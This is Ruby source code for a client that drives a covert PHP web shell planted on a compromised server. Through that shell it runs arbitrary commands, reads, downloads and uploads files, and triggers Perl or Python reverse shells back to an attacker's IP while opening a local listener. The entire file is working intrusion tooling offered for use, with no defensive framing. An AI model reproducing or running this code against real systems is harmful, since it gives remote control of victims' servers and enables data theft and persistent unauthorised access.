# Fak3r Client Connector
# Connects to the fak3r_shell.php, by HR & Join7
# Just simplifies common connection tasks to semi-covert shell...

class Fak3r
  def initialize(shell_location)
    @http=EasyCurb.new
    @shell_location = shell_location
  end

  # Check and confirm basic RCE possible with shell url
  # Returns true if MD5 is found in response, false otherwise
  def working?
    rnd = randz(8)
    chksum = Digest::MD5.hexdigest("#{rnd}")
    res = faker_request("echo md5('#{rnd}');")
    if res[0] =~ /#{chksum}/
      return true
    else
      return false
    end
  end

  # Simple Help Menu for Pseudo Shell
  def pseudo_shell_usage
    puts "Available Options for Pseudo Shell: ".underline.white
    puts "back ".light_yellow + "     => ".white + "Return to Main Menu".light_red
    puts "read ".light_yellow + "     => ".white + "Read File".light_red
    puts "download ".light_yellow + " => ".white + "Download File".light_red
    puts "upload ".light_yellow + "   => ".white + "Upload File".light_red
    puts "reverse ".light_yellow + "  => ".white + "Spawn Reverse Shell".light_red
    print_line("")
  end

  # Pseudo Command Shell
  # Leveage Markers to extract command results
  def pseudo_shell(function='system')
    supported = [ 'raw', 'system', 'passthru', 'shell_exec', 'exec']
    if supported.include?(function.downcase)
      @@funk = function.downcase
    else
      @@funk='system'
    end
    puts
    prompt = "(Command)> "
    while line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      case cmd
      when /^cls$|^clear$/i
        cls
        banner
      when /^help|^h$/i
        puts
        pseudo_shell_usage
      when /^exit$|^quit$|^back$/i
        print_error("OK, Returning to Main Menu....")
        break
      when /^change.function$|^function.change$/i
        print_status("Command Exec Function Changer")
        print_status("Current Exec Function: #{@@funk}")
        print_status("Available Functions: #{supported.join(', ')}")
        function_to_use = Readline.readline("   Enter Function to Use: ", true)
        puts
        if supported.include?(function_to_use.strip.chomp.downcase)
          @@funk = function_to_use.strip.chomp.downcase
        else
          print_error("Requested Function is NOT currently Supported!")
        end
      when /^upload$|^up$/i
        local_file = Readline.readline("   Path to Local File: ", true)
        remote_file = Readline.readline("   Remote Path to Save as: ", true)
        puts
        if File.exists?(local_file.strip.chomp)
          paygen = Payloads.new()
          print_status("Uploading #{local_file.strip.chomp} to #{remote_file.strip.chomp}...")
          code = paygen.php_upload_oneliner(local_file.strip.chomp, remote_file.strip.chomp)
          payload = code.sub(/^<\?php/, '').sub(/\?>$/, '')
          res = faker_request(payload)
          if res[1] == 200
            print_good("Appears we successfully uploaded the file!\n")
          else
            print_error("Problem Uploading File!")
            print_error("Received Status Code #{res[1]}....\n")
          end
        else
          puts
          print_error("Unable to locate local file!")
          print_error("Check path or permissions and try again....\n")
        end
      when /^read$|^read.file/i
        remote_file = Readline.readline("   Remote File to Read: ", true)
        puts
        command = "cat #{remote_file.strip.chomp}"
        payload = "print(___);"
        case @@funk.downcase
        when 'system'
          payload += "system('#{command}');"
        when 'passthru'
          payload += "passthru('#{command}');"
        when 'shell_exec'
          payload += "echo shell_exec('#{command}');"
        when 'exec'
          payload += "echo exec('#{command}');"
        when 'raw'
          payload += "#{cmd};"
        end
        payload += "print(___);"
        res = faker_request(payload)
        if res[0] =~ /___(.+)___/im
          print_line("\n#{$1}\n")
        else
          puts
          print_error("No Results Found!\n")
        end
      when /^download$|^dl$|^download.file|^dl.file/i
        remote_file = Readline.readline("   Remote File to Read: ", true)
        puts
        command = "cat #{remote_file.strip.chomp}"
        payload = "print(___);"
        case @@funk.downcase
        when 'system'
          payload += "system('#{command}');"
        when 'passthru'
          payload += "passthru('#{command}');"
        when 'shell_exec'
          payload += "echo shell_exec('#{command}');"
        when 'exec'
          payload += "echo exec('#{command}');"
        when 'raw'
          payload += "#{command};"
        end
        payload += "print(___);"
        res = faker_request(payload)
        if res[0] =~ /___(.+)___/im
          results = $1
          url = URI.parse(@shell_location)
          outdir = RESULTS + url.host
          Dir.mkdir(outdir) unless File.exists?(outdir) and File.directory?(outdir)
          fh = File.open(outdir + url.host + '/' + remote_file.strip.chomp.gsub(/[\/\\"'*$@!#%^&()+=]/,'_'), 'w+')
          fh.puts results.strip.chomp
          fh.close
          print_good("#{remote_file.strip.chomp} Downloaded to: #{outdir + url.host + '/' + remote_file.strip.chomp.gsub(/[\/\\"'*$@!#%^&()+=]/,'_')}\n")
        else
          puts
          print_error("No Results Found!\n")
        end
      when /^reverse$|^rev$|^reverse.shell/i
        reverse_ip = Readline.readline("   Enter IP: ", true)
        reverse_port = Readline.readline("   Enter Port: ", true)
        paygen = Payloads.new()
        puts

        # Select Reverse Shell Method
        while(true)
          print_caution("Select Reverse Shell Method: ")
          print_caution("1) Perl Oneliner")
          print_caution("2) Python Oneliner")
          answer = Readline.readline("   Enter Shell Option: ", true)
          puts
          if answer.strip.chomp.to_i >= 1 and answer.strip.chomp.to_i <= 2
            case answer.strip.chomp.to_i
            when 1
              command = paygen.perl_reverse_oneliner(reverse_ip.strip.chomp, reverse_port.strip.chomp.to_i).inspect.gsub("$", "\\$")
            when 2
              command = paygen.python_reverse_oneliner(reverse_ip.strip.chomp, reverse_port.strip.chomp.to_i).inspect.gsub("$", "\\$")
            end
            break
          else
            puts
            print_error("Invalid Option Selected!")
            print_error("Please try again with option from menu below...\n\n")
          end
        end
        # Launch Listener  in new X-term window.... :)
        print_status("Opening Listener on port #{reverse_port.strip.chomp} in a new x-window.....")
        separate_process_exec = "xterm -title 'RubyCat' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'ruby #{HOME}extras/rubycat.rb -l -p #{reverse_port.strip.chomp}'\""
        fireNforget(separate_process_exec)
        sleep(3)

        # Now trigger the reverse shell....
        case @@funk.downcase
        when 'system'
          res = faker_request("system(#{command});")
        when 'passthru'
          res = faker_request("passthru(#{command});")
        when 'shell_exec'
          res = faker_request("echo shell_exec(#{command});")
        when 'exec'
          res = faker_request("echo exec(#{command});")
        when 'raw'
          res = faker_request("#{command};")
        end
        if res[1] == 200
          sleep(1)
          print_status("Hopefully you caught the shell you were looking for....\n")
        else
          print_error("Possible Problem Launching Reverse Shell!")
          print_error("Received Status Code #{res[1]}....\n")
        end
      else
        payload = "print(___);"
        case @@funk.downcase
        when 'system'
          payload += "system('#{cmd}');"
        when 'passthru'
          payload += "passthru('#{cmd}');"
        when 'shell_exec'
          payload += "echo shell_exec('#{cmd}');"
        when 'exec'
          payload += "echo exec('#{cmd}');"
        when 'raw'
          payload += "#{cmd};"
        end
        payload += "print(___);"
        res = faker_request(payload)
        if res[0] =~ /___(.+)___/im
          print_line("\n#{$1}")
        else
          puts
          print_error("No Results Found!\n")
        end
      end
    end
  end

  # Reverse Shell
  def rev_shell(function_name, command_type, reverse_ip, reverse_port)
    paygen = Payloads.new()
    case command_type.downcase
    when 'perl','pl'
      command = paygen.perl_reverse_oneliner(reverse_ip, reverse_port).inspect.gsub("$", "\\$")
    when 'python','py'
      command = paygen.python_reverse_oneliner(reverse_ip, reverse_port).inspect.gsub("$", "\\$")
    else
      print_error("Unsupported Reverse Shell Type Requested!")
      return false
    end

    # Launch Listener  in new X-term window.... :)
    print_status("Opening Listener on port #{reverse_port} in a new x-window.....")
    separate_process_exec = "xterm -title 'RubyCat' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'ruby #{HOME}extras/rubycat.rb -l -p #{reverse_port}'\""
    fireNforget(separate_process_exec)
    sleep(3)

    # Now trigger the reverse shell....
    case function_name.downcase
    when 'passthru'
      res = faker_request("passthru(#{command});")
    when 'shell_exec'
      res = faker_request("echo shell_exec(#{command});")
    when 'exec'
      res = faker_request("echo exec(#{command});")
    else
      res = faker_request("system(#{command});")
    end
    if res[1] == 200
      sleep(1)
      print_status("Hopefully you caught the shell you were looking for....\n")
    else
      print_error("Possible Problem Launching Reverse Shell!")
      print_error("Received Status Code #{res[1]}....\n")
    end
  end

  # Make Requests to Target Fak3r Shell
  # Returns the http response array
  def faker_request(payload)
    # Do we need to reset the add headers later?
    if $config['HTTP']['HTTP_HEADERS_ADD']
      switch=false
    else
      switch=true
      $config['HTTP']['HTTP_HEADERS_ADD']=true
    end
    # Set The Header
    $config['HTTP']['HTTP_HEADERS'].store("X-HTTP-METHOD-OVERRIDE", 'PUT')

    # Send the request
    res = @http.post(@shell_location, '_=' + payload.b64e.gsub("\n", ''))
    # Reset Headers back to the way the were...
    $config['HTTP']['HTTP_HEADERS'].delete("X-HTTP-METHOD-OVERRIDE")
    if switch
      $config['HTTP']['HTTP_HEADERS_ADD']=false
    end
    return res
  end
end
